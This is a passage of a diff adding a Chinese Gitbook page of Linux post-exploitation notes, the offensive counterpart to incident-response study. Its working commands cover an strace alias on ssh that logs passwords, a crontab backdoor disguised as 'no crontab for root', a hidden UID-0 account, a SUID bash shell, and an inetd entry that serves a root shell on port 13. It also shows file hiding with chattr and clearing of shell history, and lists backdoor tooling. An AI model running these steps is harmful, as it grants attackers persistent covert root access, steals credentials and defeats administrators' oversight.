+<span class="token builtin class-name">echo</span> <span class="token string">&quot;alias ssh=&apos;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&apos;&quot;</span> <span class="token operator">&gt;&gt;</span> /root/.bashrc
+<span class="token comment"># &#x7ACB;&#x5373;&#x751F;&#x6548;</span>
+<span class="token builtin class-name">source</span> /root/.bashrc
+</code></pre>
+<p>kali&#x6CA1;&#x6709;strace&#xFF0C;&#x4F46;&#x662F;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x9ED8;&#x8BA4;&#x662F;&#x88C5;&#x4E86;&#x7684;</p>
+<p><img src="../images/image-20230830223830491.png" alt="image-20230830223830491"></p>
+<p>&#x67E5;&#x770B;&#x8BB0;&#x5F55;&#x7684;ssh&#x8FDE;&#x63A5;</p>
+<pre class="language-"><code class="lang-shell"><span class="token function">cat</span> /tmp/.ssh.log
+</code></pre>
+<p><img src="../images/image-20230830232440346.png" alt="image-20230830232440346"></p>
+<h2 id="&#x81EA;&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x540E;&#x95E8;">&#x81EA;&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x540E;&#x95E8;</h2>
+<p>&#x5199;&#x5165;&#x81EA;&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x4E2D;</p>
+<ul>
+<li><p>&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;</p>
+<pre class="language-"><code class="lang-bash">/etc/init.d/
+/etc/profile.d/
+/etc/rc.d/xxx <span class="token comment"># &#x5728;xxx&#x4E2D;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x5F00;&#x673A;&#x6267;&#x884C;&#x7684;&#x811A;&#x672C;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span>
+</code></pre>
+</li>
+<li><p>bash shell&#x542F;&#x52A8;&#x9879;</p>
+<pre class="language-"><code class="lang-bash">/etc/profile 
+<span class="token environment constant">$HOME</span>/.bash_profile
+<span class="token environment constant">$HOME</span>/.bashrc 
+<span class="token environment constant">$HOME</span>/.bash_login 
+<span class="token environment constant">$HOME</span>/.profile
+</code></pre>
+</li>
+</ul>
+<h2 id="&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x540E;&#x95E8;">&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x540E;&#x95E8;</h2>
+<pre class="language-"><code class="lang-shell"><span class="token builtin class-name">echo</span> xxx <span class="token operator">&gt;</span> /tmp/1.elf
+<span class="token function">chmod</span> +x /tmp/1.elf
+
+<span class="token punctuation">(</span>crontab -l<span class="token punctuation">;</span><span class="token builtin class-name">printf</span> <span class="token string">&quot;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;<span class="token entity" title="\r">\r</span>no crontab for <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>%100c<span class="token entity" title="\n">\n</span>&quot;</span><span class="token punctuation">)</span>
+</code></pre>
+<p><img src="../images/image-20230830235507613.png" alt="image-20230830235507613"></p>
+<p>&#x5C06;no crontab for <code>whoami</code>&#x6587;&#x4EF6;&#x5199;&#x5230;/var/spool/cron/crontabs/root&#x4E2D;&#xFF0C;&#x800C;crontab -l&#x5C31;&#x662F;&#x5217;&#x51FA;&#x4E86;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x6240;&#x4EE5;&#x5F53;&#x7BA1;&#x7406;&#x5458;&#x4F7F;&#x7528;crontab -l&#x67E5;&#x770B;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x770B;&#x5230;no crontab for root&#xFF0C;&#x4ECE;&#x800C;&#x8D77;&#x5230;&#x4E86;&#x9690;&#x85CF;&#x7684;&#x6548;&#x679C;&#x3002;</p>
+<p><img src="../images/image-20230830235746458.png" alt="image-20230830235746458"></p>
+<h2 id="&#x6DFB;&#x52A0;&#x8D85;&#x7EA7;&#x7528;&#x6237;">&#x6DFB;&#x52A0;&#x8D85;&#x7EA7;&#x7528;&#x6237;</h2>
+<p>&#x5E94;&#x6025;&#x54CD;&#x5E94;&#x7B2C;&#x4E00;&#x4E2A;&#x5C31;&#x6392;&#x67E5;<code>/etc/passwd</code></p>
+<pre class="language-"><code class="lang-shell"><span class="token function">useradd</span> <span class="token parameter variable">-p</span> <span class="token variable"><span class="token variable">`</span>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> <span class="token string">&apos;salt&apos;</span> <span class="token number">123456</span><span class="token variable">`</span></span> guest <span class="token parameter variable">-o</span> <span class="token parameter variable">-u</span> <span class="token number">0</span> <span class="token parameter variable">-g</span> root <span class="token parameter variable">-G</span> root <span class="token parameter variable">-s</span> /bin/bash <span class="token parameter variable">-d</span> /home/test
+</code></pre>
+<p><img src="../images/image-20230831001351639.png" alt="image-20230831001351639"></p>
+<h2 id="suid&#x540E;&#x95E8;">Suid&#x540E;&#x95E8;</h2>
+<blockquote>
+<p><strong>SUID&#x6743;&#x9650;&#x4EC5;&#x5BF9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x6709;&#x6548;</strong></p>
+</blockquote>
+<pre class="language-"><code class="lang-shell"><span class="token function">cp</span> /bin/bash /tmp/.long <span class="token comment">#&#x5C06;bash&#x547D;&#x4EE4;cp&#x5230;.long&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x4E2D;</span>
+<span class="token function">chmod</span> u+s /tmp/.long <span class="token comment">#&#x8D4B;&#x4E88;SUID&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;</span>
+</code></pre>
+<pre class="language-"><code class="lang-shell">/tmp/.long <span class="token parameter variable">-p</span>
+</code></pre>
+<blockquote>
+<p>bash2 &#x9488;&#x5BF9;suid&#x6709;&#x4E00;&#x4E9B;&#x9632;&#x62A4;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x52A0;&#x4E0A;-p&#x53C2;&#x6570;&#x6765;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;root&#x7684;shell&#x3002;</p>
+</blockquote>
+<p><img src="../images/image-20230831155343319.png" alt="image-20230831155343319"></p>
+<h2 id="inetd&#x540E;&#x95E8;">inetd&#x540E;&#x95E8;</h2>
+<p>inetd&#x662F;&#x4E00;&#x4E2A;&#x76D1;&#x542C;&#x5916;&#x90E8;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;(&#x5C31;&#x662F;&#x4E00;&#x4E2A;socket)&#x7684;&#x7CFB;&#x7EDF;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4E3A;13&#x7AEF;&#x53E3;&#x3002;&#x5F53;inetd&#x63A5;&#x6536;&#x5230;&#x4E00;&#x4E2A;&#x5916;&#x90E8;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x5B83;&#x4F1A;&#x6839;&#x636E;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x53BB;&#x627E;&#x5230;&#x5B9E;&#x9645;&#x5904;&#x7406;&#x5B83;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x628A;&#x63A5;&#x6536;&#x5230;&#x7684;&#x8FD9;&#x4E2A;socket&#x4EA4;&#x7ED9;&#x90A3;&#x4E2A;&#x7A0B;&#x5E8F;&#x53BB;&#x5904;&#x7406;&#x3002;</p>
+<pre class="language-"><code class="lang-bash"><span class="token comment"># &#x5B89;&#x88C5;</span>
+<span class="token function">apt-get</span> <span class="token function">install</span> openbsd-inetd  
+<span class="token comment"># &#x5199;&#x5165;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span>
+<span class="token builtin class-name">echo</span> <span class="token string">&apos;daytime stream tcp nowait root /bin/bash bash -i&apos;</span> <span class="token operator">&gt;&gt;</span> /etc/inetd.conf
+<span class="token comment"># &#x8BF7;&#x6C42;daytime&#x670D;&#x52A1;&#x5BF9;&#x5E94;&#x7684;13&#x7AEF;&#x53E3;</span>
+<span class="token function">nc</span> <span class="token parameter variable">-vv</span> <span class="token number">192.168</span>.111.128 <span class="token number">13</span>
+</code></pre>
+<p><img src="../images/image-20231015225609770.png" alt="image-20231015225609770"></p>
+<p>&#x914D;&#x7F6E;&#x89E3;&#x91CA;</p>
+<pre class="language-"><code class="lang-bash"><span class="token operator">&lt;</span>service_name<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>sock_type<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>proto&#xFF1A;TCP/UDP<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>flags<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>user<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>server_path&#xFF1A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>args<span class="token operator">&gt;</span>
+daytime stream tcp nowait root /bin/bash <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token comment"># &#x5F53;&#x5916;&#x90E8;&#x8BF7;&#x6C42;&#x540D;&#x4E3A;daytime&#x7684;&#x670D;&#x52A1;&#x65F6;&#x5C31;&#x5F39;shell</span>
+</code></pre>
+<p>&#x66F4;&#x6539;&#x7684;&#x8BDD;&#x53EA;&#x9700;&#x8981;&#x4FEE;&#x6539;service_name&#x548C;nc&#x8FDE;&#x63A5;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x670D;&#x52A1;&#x4E0E;&#x7AEF;&#x53E3;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x5728;<code>/etc/services</code>&#x4E2D;</p>
+<h2 id="icmp&#x540E;&#x95E8;">ICMP&#x540E;&#x95E8;</h2>
+<p><a href="https://github.com/andreafabrizi/prism" target="_blank">https://github.com/andreafabrizi/prism</a></p>
+<h2 id="dns&#x540E;&#x95E8;">DNS&#x540E;&#x95E8;</h2>
+<p><a href="https://github.com/DamonMohammadbagher/NativePayload_DNS" target="_blank">https://github.com/DamonMohammadbagher/NativePayload_DNS</a>
+<a href="https://github.com/iagox86/dnscat2" target="_blank">https://github.com/iagox86/dnscat2</a>
+<a href="http://code.kryo.se/iodine" target="_blank">http://code.kryo.se/iodine</a></p>
+<h2 id="&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;">&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;</h2>
+<p><a href="https://github.com/gaffe23/linux-inject" target="_blank">https://github.com/gaffe23/linux-inject</a>
+<a href="https://sourceforge.net/projects/cymothoa/files/" target="_blank">https://sourceforge.net/projects/cymothoa/files/</a>
+<a href="https://github.com/screetsec/Vegile" target="_blank">https://github.com/screetsec/Vegile</a></p>
+<h2 id="&#x9690;&#x85CF;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x6280;&#x5DE7;">&#x9690;&#x85CF;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;&#x6280;&#x5DE7;</h2>
+<ul>
+<li><p>&#x521B;&#x5EFA;&#x4EE5;.&#x5F00;&#x5934;&#x7684;&#x9690;&#x85CF;&#x6587;&#x4EF6;</p>
+<p>&#x7528;<code>ls -a</code>&#x624D;&#x80FD;&#x770B;&#x5230;</p>
+</li>
+<li><p>&#x5EFA;&#x7ACB;&#x6587;&#x4EF6;&#x540D;&#x4E3A;<code>...</code>&#x7684;&#x6587;&#x4EF6;</p>
+</li>
+<li><p>&#x53C2;&#x6570;&#x6DF7;&#x6DC6;</p>
+<blockquote>
+<p>&#x4E0B;&#x9762;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>rm -- -rm</code>&#x5220;&#x9664;</p>
+</blockquote>
+<ul>
+<li>&#x5EFA;&#x7ACB;&#x6587;&#x4EF6;&#x540D;&#x4E3A;<code>-rm</code>&#x7684;&#x6587;&#x4EF6;</li>
+</ul>
+<p><img src="../images/image-20231015223351352.png" alt="image-20231015223351352"></p>
+</li>
+</ul>
+<ul>
+<li><p>&#x5EFA;&#x7ACB;&#x6587;&#x4EF6;&#x540D;&#x4E3A;<code>--</code>&#x7684;&#x6587;&#x4EF6;</p>
+<p><img src="../images/image-20231015223510528.png" alt="image-20231015223510528"></p>
+<p>&#x65E2;&#x4E0D;&#x62A5;&#x9519;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x5220;&#x9664;</p>
+</li>
+</ul>
+<ul>
+<li><p>chattr&#x9690;&#x85CF;&#x6743;&#x9650;</p>
+<blockquote>
+<p>chattr +i &#x662F;&#x4E00;&#x4E2A; Linux &#x547D;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x5C06;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E0D;&#x53EF;&#x4FEE;&#x6539;&#xFF08;immutable&#xFF09;&#x3002;&#x5F53;&#x5E94;&#x7528;&#x4E86; +i &#x5C5E;&#x6027;&#x540E;&#xFF0C;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x5C06;&#x65E0;&#x6CD5;&#x88AB;&#x4FEE;&#x6539;&#x3001;&#x5220;&#x9664;&#x3001;&#x91CD;&#x547D;&#x540D;&#x6216;&#x94FE;&#x63A5;&#x3002;&#x8FD9;&#x4E2A;&#x5C5E;&#x6027;&#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x4FDD;&#x62A4;&#x5173;&#x952E;&#x7CFB;&#x7EDF;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#xFF0C;&#x9632;&#x6B62;&#x5B83;&#x4EEC;&#x88AB;&#x610F;&#x5916;&#x6216;&#x6076;&#x610F;&#x7BE1;&#x6539;&#x3002;&#x8BF7;&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x9700;&#x8981;&#x5728;<strong>&#x5177;&#x6709;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#x7684;&#x7528;&#x6237;</strong>&#x4E0B;&#x6267;&#x884C;</p>
+</blockquote>
+<pre class="language-"><code class="lang-bash">chattr +i hack.sh  <span class="token comment">#lsattr&#x624D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BE5;&#x6743;&#x9650;</span>
+</code></pre>
+</li>
+</ul>
+<p><img src="../images/image-20230831163015163.png" alt="image-20230831163015163"></p>
+<pre class="language-"><code class="lang-bash"><span class="token comment"># &#x5220;&#x9664;</span>
+chattr <span class="token parameter variable">-i</span> hack.sh
+<span class="token function">rm</span> <span class="token parameter variable">-rf</span> hack.sh
+</code></pre>
+<h2 id="&#x5DE5;&#x5177;">&#x5DE5;&#x5177;</h2>
+<p>&#x9700;&#x8981;python3&#x73AF;&#x5883;<a href="https://github.com/RuoJi6/HackerPermKeeper" target="_blank">RuoJi6/HackerPermKeeper (github.com)</a></p>
+<table>
+<thead>
+<tr>
+<th>&#x1F512;&#x6743;&#x9650;&#x7EF4;&#x6301;&#x6A21;&#x5757;</th>
+<th>centos</th>
+<th>Ubuntu</th>
+<th>&#x63A8;&#x8350;&#x6307;&#x6570;</th>
+<th>&#x9700;&#x8981;&#x6743;&#x9650;</th>
+<th>&#x5907;&#x6CE8;</th>
+<th>py2</th>
+<th>py3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OpenSSH&#x540E;&#x95E8;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&amp;&#x8BB0;&#x5F55;&#x5BC6;&#x7801;</td>
+<td>&#x274C;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50;</td>
+<td>root</td>
+<td>&#x6B64;&#x540E;&#x95E8;&#x9700;&#x8981;&#x5F88;&#x8001;&#x7684;&#x5185;&#x6838;&#x7248;&#x672C;&#xFF0C;&#x800C;&#x4E14;&#x9700;&#x8981;&#x5F88;&#x591A;&#x4F9D;&#x8D56;&#x73AF;&#x5883;</td>
+<td>&#x274C;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>PAM&#x540E;&#x95E8;</td>
+<td>&#x274C;</td>
+<td>&#x274C;</td>
+<td>&#x2B50;</td>
+<td>&#x274C;</td>
+<td>&#x6B64;&#x540E;&#x95E8;&#x9700;&#x8981;&#x5F88;&#x8001;&#x7684;&#x5185;&#x6838;&#x7248;&#x672C;&#xFF0C;&#x800C;&#x4E14;&#x9700;&#x8981;&#x5F88;&#x591A;&#x4F9D;&#x8D56;&#x73AF;&#x5883;</td>
+<td>&#x274C;</td>
+<td>&#x274C;</td>
+</tr>
+<tr>
+<td>ssh&#x8F6F;&#x94FE;&#x63A5;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50;</td>
+<td>root</td>
+<td>&#x5BB9;&#x6613;&#x88AB;&#x53D1;&#x73B0;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>ssh&#x516C;&#x79C1;&#x5BC6;&#x94A5;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50; &#x2B50; &#x2B50;</td>
+<td>User</td>
+<td>&#x53D1;&#x73B0;&#x7A0B;&#x5EA6;&#x5F88;&#x96BE;&#xFF0C;&#x53C2;&#x8003;&#x4E86;&#x6316;&#x77FF;&#x75C5;&#x6BD2;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>&#x540E;&#x95E8;&#x5E10;&#x53F7;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50;</td>
+<td>root</td>
+<td>&#x7528;&#x547D;&#x4EE4;&#x6DFB;&#x52A0;&#x8D26;&#x6237;&#xFF0C;&#x4E0D;&#x4F1A;&#x521B;&#x5EFA;&#x7528;&#x6237;home&#x76EE;&#x5F55;[&#x6709;&#x4E00;&#x4E2A;&#x662F;&#x76F4;&#x63A5;&#x6307;&#x5411;root&#x76EE;&#x5F55;]</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>crontab&#x8BA1;&#x5212;&#x4EFB;&#x52A1;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50; &#x2B50;</td>
+<td>User or root</td>
+<td>&#x96BE;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x901A;&#x8FC7;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>Strace&#x540E;&#x95E8;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50;</td>
+<td>root</td>
+<td>&#x952E;&#x76D8;&#x8BB0;&#x5F55;&#x7684;&#x540E;&#x95E8;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>Alias&#x540E;&#x95E8;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50; &#x2B50;</td>
+<td>root</td>
+<td>&#x522B;&#x540D;&#x540E;&#x95E8;&#xFF0C;&#x96BE;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x8981;&#x7528;&#x6237;&#x53BB;&#x6267;&#x884C;&#x547D;&#x4EE4;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>Rootkit&#x540E;&#x95E8;[&#x68C0;&#x6D4B;]</td>
+<td>&#x274C;</td>
+<td>&#x274C;</td>
+<td>&#x2B50; &#x2B50; &#x2B50;</td>
+<td>root</td>
+<td>&#x96BE;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x4F46;&#x662F;&#x5B89;&#x88C5;&#x590D;&#x6742;&#xFF0C;&#x800C;&#x4E14;&#x6307;&#x5B9A;&#x5185;&#x6838;&#x7248;&#x672C;</td>
+<td>&#x274C;</td>
+<td>&#x274C;</td>
+</tr>
+<tr>
+<td>&#x7A7A;&#x683C;&#x4E0D;&#x8BB0;&#x5F55;&#x547D;&#x4EE4;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50;&#x2B50;&#x2B50;&#x2B50;</td>
+<td>root</td>
+<td>&#x6709;&#x7684;&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;&#x4E86;&#x7A7A;&#x683C;&#x8BB0;&#x5F55;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x5FEB;&#x901F;&#x8BBE;&#x7F6E;&#x4E0D;&#x8BB0;&#x5F55;&#x7A7A;&#x683C;&#x547D;&#x4EE4;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>ssh&#x8F6F;&#x94FE;&#x63A5;&amp;crontab</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50; &#x2B50;</td>
+<td>root</td>
+<td>&#x5FEB;&#x901F;&#x751F;&#x6210;&#x8F6F;&#x94FE;&#x63A5;&#xFF0C;&#x5E76;&#x4E14;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6BCF;&#x5206;&#x949F;&#x5224;&#x65AD;&#x5F53;&#x524D;&#x8F6F;&#x94FE;&#x63A5;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x5982;&#x679C;&#x88AB;kill&#x6389;&#xFF0C;&#x5C31;&#x91CD;&#x65B0;&#x6267;&#x884C;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>check.py</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50; &#x2B50;&#x2B50;&#x2B50;</td>
+<td>User</td>
+<td>&#x5FEB;&#x901F;&#x68C0;&#x6D4B;&#x76EE;&#x6807;&#x673A;&#x5668;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x90A3;&#x4E2A;&#x6743;&#x9650;&#x7EF4;&#x6301;&#x6A21;&#x5757;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>sshkey&#x5BC6;&#x94A5;&amp;crontab</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50; &#x2B50;&#x2B50; &#x2B50;</td>
+<td>User or root</td>
+<td>&#x5FEB;&#x901F;&#x751F;&#x6210;ssh&#x5BC6;&#x94A5;&#xFF0C;&#x5E76;&#x4E14;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6BCF;&#x5206;&#x949F;&#x5224;&#x65AD;&#x5F53;&#x524D;&#x5BC6;&#x94A5;&#x548C;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x5982;&#x679C;&#x88AB;kill&#x6389;&#xFF0C;&#x5C31;&#x91CD;&#x65B0;&#x6267;&#x884C;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+<tr>
+<td>php&#x6743;&#x9650;&#x7EF4;&#x6301;&#x4E0D;&#x6B7B;&#x514D;&#x6740;&#x9A6C;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2B50; &#x2B50; &#x2B50; &#x2B50;&#x2B50; &#x2B50;</td>
+<td>User or root</td>
+<td>phpweb&#x6743;&#x9650;&#x7EF4;&#x6301;&#x9A6C;</td>
+<td>&#x2714;&#xFE0F;</td>
+<td>&#x2714;&#xFE0F;</td>
+</tr>
+</tbody>
+</table>
+<h1 id="linux&#x75D5;&#x8FF9;&#x6E05;&#x7406;">Linux&#x75D5;&#x8FF9;&#x6E05;&#x7406;</h1>
+<p>&#x5386;&#x53F2;&#x547D;&#x4EE4;</p>
+<pre class="language-"><code class="lang-bash"><span class="token comment"># &#x7981;&#x7528;&#x4E86;Shell&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x547D;&#x4EE4;&#x5386;&#x53F2;&#x8DDF;&#x8E2A;&#x548C;&#x5B58;&#x50A8;</span>
+<span class="token builtin class-name">unset</span> HISTORY <span class="token environment constant">HISTFILE</span> HISTSAVE HISTZONE HISTORY HISTLOG<span class="token punctuation">;</span> 
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTFILE</span></span><span class="token operator">=</span>/dev/null<span class="token punctuation">;</span> 
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTSIZE</span></span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> 
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTFILESIZE</span></span><span class="token operator">=</span><span class="token number">0</span>
+</code></pre>
+<p><a href="https://fgtbnc.github.io/2023/06/01/&#x5165;&#x4FB5;&#x75D5;&#x8FF9;&#x6E05;&#x7406;/#Linux&#x5165;&#x4FB5;&#x75D5;&#x8FF9;&#x6E05;&#x7406;" target="_blank">&#x5165;&#x4FB5;&#x75D5;&#x8FF9;&#x6E05;&#x7406; | Khaz&apos;s Blog (fgtbnc.github.io)</a></p>
+<h1 id="linux&#x6587;&#x4EF6;&#x4F20;&#x8F93;">Linux&#x6587;&#x4EF6;&#x4F20;&#x8F93;</h1>
+<p><a href="https://www.cnblogs.com/yokan/p/16069234.html" target="_blank">https://www.cnblogs.com/yokan/p/16069234.html</a></p>
+<p>SCP</p>
+<pre class="language-"><code class="lang-bash"><span class="token function">scp</span> <span class="token parameter variable">-P</span> port <span class="token function">file</span> root@104.243.25.78:/root/source_code
+</code></pre>
+<p>&#x9700;&#x8981;&#x8F93;&#x5165;ssh&#x5BC6;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x5148;&#x83B7;&#x5F97;&#x4EA4;&#x4E92;&#x5F0F;shell</p>
+<h1 id="&#x5176;&#x4ED6;">&#x5176;&#x4ED6;</h1>
+<pre class="language-"><code class="lang-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">&quot;*.conf&quot;</span>
+
+<span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">&quot;*python*&quot;</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-executable</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+</code></pre>
+<p>&#x4E0A;&#x4F20;&#x7684;php&#x65E0;&#x6CD5;&#x6267;&#x884C;</p>
+<pre class="language-"><code class="lang-bash">&#x5728;php&#x5F00;&#x5934;&#x6DFB;&#x52A0; <span class="token comment">#!/bin/php&#x5E76;&#x6267;&#x884C;chmod +x xx.php</span>
+</code></pre>
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Khaz 2024 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2024-11-30 20:26:06
+</span></footer>
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                        
+                    </section>
+                    
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+        
+        
+        
+    </div>
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
